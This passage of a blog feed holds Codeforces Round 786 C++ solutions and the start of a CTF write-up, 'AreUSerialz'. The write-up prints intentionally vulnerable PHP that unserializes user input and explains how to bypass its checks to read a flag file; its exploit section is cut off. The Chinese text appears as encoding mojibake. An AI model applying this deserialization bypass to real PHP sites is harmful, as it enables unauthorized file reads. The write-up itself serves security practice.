class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(first&gt;second)<span class="built_in">swap</span>(first,second);</span><br><span class="line">        </span><br><span class="line">        res+=second-first;</span><br><span class="line">        second-=<span class="number">2</span>*res;</span><br><span class="line">        first-=res;</span><br><span class="line">        <span class="keyword">if</span>(first&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            res=<span class="built_in">max</span>(a[i]+<span class="number">1</span>,a[i+<span class="number">1</span>]+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">            <span class="comment">//printf(&quot;%d\n&quot;,res);</span></span><br><span class="line">            ans=<span class="built_in">min</span>(ans,res);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> times=first/<span class="number">3</span>;</span><br><span class="line">        res+=times*<span class="number">2</span>;</span><br><span class="line">        first-=times*<span class="number">3</span>;</span><br><span class="line">        second-=times*<span class="number">3</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,first,second);</span></span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,times);</span></span><br><span class="line">        <span class="keyword">while</span>(first&gt;<span class="number">0</span>||second&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(first&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                res+=second/<span class="number">2</span>+second%<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(second&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                res+=first/<span class="number">2</span>+first%<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(first&gt;second)&#123;</span><br><span class="line">                    first-=<span class="number">2</span>;</span><br><span class="line">                    second-=<span class="number">1</span>;</span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    second-=<span class="number">2</span>;</span><br><span class="line">                    first-=<span class="number">1</span>;</span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; </span><br><span class="line">        ans=<span class="built_in">min</span>(ans,res);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,ans); </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n<span class="number">-1</span>;i++)&#123;<span class="comment">//ï¿ Ãº </span></span><br><span class="line">        <span class="keyword">int</span> first=<span class="built_in">min</span>(a[i],a[i+<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">int</span> second=<span class="built_in">max</span>(a[i],a[i+<span class="number">2</span>]);</span><br><span class="line">        </span><br><span class="line">        ans=<span class="built_in">min</span>(ans,first+(second-first)/<span class="number">2</span>+(second-first)%<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    ans=<span class="built_in">min</span>(ans,(a[<span class="number">1</span>]/<span class="number">2</span>+a[<span class="number">1</span>]%<span class="number">2</span>+a[<span class="number">2</span>]/<span class="number">2</span>+a[<span class="number">2</span>]%<span class="number">2</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//    #ifndef ONLINE_JUDGE</span></span><br><span class="line"><span class="comment">//        freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line"><span class="comment">//    #endif</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Desktop-Rearrangement"><a href="#F-Desktop-Rearrangement" class="headerlink" title="F. Desktop Rearrangement"></a>F. Desktop Rearrangement</h2><h3 id="é¢˜ç›®æè¿°-5"><a href="#é¢˜ç›®æè¿°-5" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/6.png" alt="6"></p><h3 id="é¢˜ç›®åˆ†æ-5"><a href="#é¢˜ç›®åˆ†æ-5" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å°±æ˜¯ç»™ä½ ä¸€ä¸ªæ¡Œé¢ï¼Œæ¯æ¬¡è¯¢é—®çš„æ—¶å€™æ·»åŠ æˆ–å‡å°‘å›¾æ ‡ï¼Œè¯¢é—®éœ€è¦å‡ æ¬¡æ’åˆ—å¥½å›¾æ ‡ã€‚è¿™ä¸ªç›´æ¥æš´åŠ›æ¨¡æ‹Ÿå°±å¯ä»¥äº†ï¼Œé¦–å…ˆè®¡ç®—å‡ºæœ‰å¤šå°‘ä¸ªå›¾æ ‡ï¼Œç„¶åæŠŠå®ƒæ‹æˆä¸€åˆ—ï¼Œå›¾æ ‡ä¸‹æ ‡åœ¨è¿™ä¸ªå€¼æ•°é‡ä¹‹å¤–çš„æ•°ç›®å°±æ˜¯ç­”æ¡ˆäº†ã€‚æ¯æ¬¡å¢åŠ æˆ–å‡å°‘æœ€å¤šå¯¹ç­”æ¡ˆäº§ç”Ÿ $1$ çš„å½±å“ï¼Œæ‰€ä»¥ä¹Ÿä¸éš¾ã€‚å°±æ˜¯è¿™ä¸ªx,yï¼Œæ¯”èµ›çš„æ—¶å€™æ€»æ˜¯æåï¼Œæœ€åå‘ç°è¿™ä¸ªxæ˜¯è¡Œå·ï¼Œyæ˜¯åˆ—å·ã€‚</p><h3 id="æ ‡ç¨‹-5"><a href="#æ ‡ç¨‹-5" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 2000005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m,q;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;q;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[j]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                a[j*n+i+<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n*m;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;=cnt&amp;&amp;a[i]==<span class="number">0</span>)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    for(int i=1;i&lt;=n*m;i++)&#123;</span></span><br><span class="line"><span class="comment">//        putchar(&#x27;0&#x27;+a[i]);</span></span><br><span class="line"><span class="comment">//    &#125;putchar(10);</span></span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);;</span></span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> y,x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;y,&amp;x);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> pos=(x<span class="number">-1</span>)*n+y;</span><br><span class="line">        <span class="keyword">if</span>(a[pos]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;pos %d appear\n&quot;,pos);</span></span><br><span class="line">            </span><br><span class="line">            cnt++;</span><br><span class="line">            <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[cnt]==<span class="number">1</span>)&#123;</span><br><span class="line">                flag--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pos&gt;cnt)&#123;</span><br><span class="line">                flag++;</span><br><span class="line">            &#125;</span><br><span class="line">            a[pos]=<span class="number">1</span>;</span><br><span class="line">            ans+=flag;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;pos %d disappear\n&quot;,pos);</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[cnt]==<span class="number">1</span>)&#123;</span><br><span class="line">                flag++;</span><br><span class="line">            &#125;</span><br><span class="line">            cnt--;</span><br><span class="line">            <span class="keyword">if</span>(pos&gt;cnt)&#123;</span><br><span class="line">                flag--;</span><br><span class="line">            &#125;</span><br><span class="line">            a[pos]=<span class="number">0</span>;</span><br><span class="line">            ans+=flag;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        for(int i=1;i&lt;=n*m;i++)&#123;</span></span><br><span class="line"><span class="comment">//            putchar(&#x27;0&#x27;+a[i]);</span></span><br><span class="line"><span class="comment">//        &#125;putchar(10);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>èµ›ä¸­åšå‡ºäº”é“ï¼Œèµ›åè¢«å‰ä¸€é“è¿˜è¡Œå§ï¼Œåæ­£ABCDå†™çš„æŒºå¿«çš„ï¼Œç­¾åˆ°æ‰‹é€Ÿå·²ç»åœ¨ç¨³æ­¥æå‡ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://codeforces.com/contest/1674&quot;&gt;Codeforces Round #786 (Div. 3)&lt;/a&gt;é¢˜è§£æ¥äº†&lt;/p&gt;
&lt;p&gt;å®æ—¶å½•é¢‘åœ¨&lt;a href=&quot;https://www.bilibili.com/video/BV18B4y117sn?spm_id_from=333.999.0.0&quot;&gt;è¿™é‡Œ&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="é¢˜è§£" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>ç½‘é¼æ¯ 2020 é’é¾™ç»„AreUSerialz writeup</title>
    <link href="http://example.com/2022/04/28/wdb2020AreUSerialz/"/>
    <id>http://example.com/2022/04/28/wdb2020AreUSerialz/</id>
    <published>2022-04-27T16:04:00.000Z</published>
    <updated>2022-04-28T12:40:52.841Z</updated>
    
    <content type="html"><![CDATA[<p>åšåˆ°ä¸€é“é¢˜ï¼Œå†™ä¸‹ <code>write up</code></p><span id="more"></span><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><p>æœ¬é¢˜ç»™äº†æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯ <code>php</code> ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸»è¦çœ‹çœ‹ææ„å‡½æ•° <code>__destruct</code>ï¼Œå¦‚æœæˆå‘˜ <code>$this-&gt;op===&quot;2&quot;</code> é‚£ä¹ˆè®©å®ƒå˜æˆ1ï¼Œ<code>$this-&gt;content</code> å˜ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œæ‰§è¡Œ <code>process</code> å‡½æ•°ã€‚é‚£æˆ‘ä»¬çœ‹çœ‹ <code>$this-&gt;process</code> å‡½æ•°çš„å…·ä½“ç»†èŠ‚ï¼Œå¦‚æœ <code>$this-&gt;op==&quot;2&quot;</code> é‚£ä¹ˆæ‰§è¡Œ <code>read</code> å‡½æ•°ï¼Œå¦åˆ™æ‰§è¡Œ <code>write</code> å‡½æ•°ã€‚é¦–å…ˆé¢˜ç›®å¼€å§‹ç»™æˆ‘ä»¬çœ‹åˆ°äº†æ˜¯æœ‰ä¸€ä¸ª <code>flag.php</code> æ–‡ä»¶çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‚¯å®šæ˜¯è¦åˆ©ç”¨è¿™ä¸ªå¯¹è±¡è¿›è¡Œè¯» <code>flag.php</code> æ“ä½œçš„ï¼Œä½†æ˜¯ææ„å‡½æ•°çš„æ—¶å€™ä¼šå¦‚æœå‘ç°æ“ä½œä¸ºè¯»ï¼Œåˆ™æ”¹ä¸ºå†™æ“ä½œã€‚é‚£ä¹ˆè¿™é‡Œéœ€è¦ç»•è¿‡ä¸€ä¸‹ï¼Œå› ä¸ºææ„å‡½æ•°è¿™é‡Œæ˜¯å¼ºæ¯”è¾ƒï¼Œè€Œ <code>process</code> å‡½æ•°åˆ¤æ–­è¯»å†™æ“ä½œæ˜¯å¼±æ¯”è¾ƒï¼Œè¿™é‡Œæˆ‘ä»¬ååºåˆ—åŒ–çš„æ—¶å€™å°±å¯ä»¥ç»™ä¸€ä¸ª <code>int</code> ç»•è¿‡å»ï¼Œè®©å®ƒä¸ä¼šè¢«æ”¹å˜å¹¶ä¸”å¯ä»¥è¢«åˆ¤æ–­ä¸ºæ˜¯è¯»æ“ä½œã€‚</p><p>ç„¶åæˆ‘ä»¬å†æ¥çœ‹çœ‹å¤–é¢ï¼Œå¯ä»¥å‘ç°ç”¨äº†ä¸€ä¸ªå‡½æ•° <code>is_valid</code> ç”¨äºè¿‡æ»¤éæ³•å­—ç¬¦ï¼Œè€Œæˆ‘ä»¬ååºåˆ—åŒ–å¦‚æœå¯¹è±¡æœ¬èº«å¸¦æœ‰ <code>private</code> æˆ–è€… <code>protected</code> ç±»å‹çš„å¯¹è±¡æ—¶ï¼Œä¸€å®šè¦ç”¨ <code>0</code> å­—èŠ‚æ¥ååºåˆ—åŒ–ï¼Œä¸ç„¶ä¼šå¤±è´¥ï¼Œä½†æ˜¯ä½ç‰ˆæœ¬çš„ <code>php</code> å¯¹ç±»å‹ä¸æ•æ„Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æŠŠæˆå‘˜ç±»å‹æ”¹æˆ <code>public</code> ç„¶åæŒ‰ç…§è¿™ä¸ªæ–¹æ³•æ„é€ å¾—åˆ°çš„åºåˆ—åŒ–ç»“æœå°±æ˜¯ <code>payload</code>ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span 